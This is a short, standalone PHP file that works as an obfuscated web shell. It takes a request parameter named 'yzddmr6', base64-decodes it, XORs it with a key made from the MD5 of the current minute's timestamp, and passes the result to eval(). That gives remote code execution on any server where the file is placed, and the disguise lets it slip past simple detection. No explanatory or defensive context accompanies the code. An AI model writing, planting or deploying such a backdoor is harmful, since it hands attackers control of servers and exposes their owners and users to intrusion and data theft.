<?php
date_default_timezone_set("PRC");
@$post=base64_decode($_REQUEST['yzddmr6']);
$key=md5(date("Y-m-d H:i",time()));
for($i=0;$i<strlen($post);$i++){
    $post[$i] = $post[$i] ^ $key[$i%32];
}
eval($post);
?>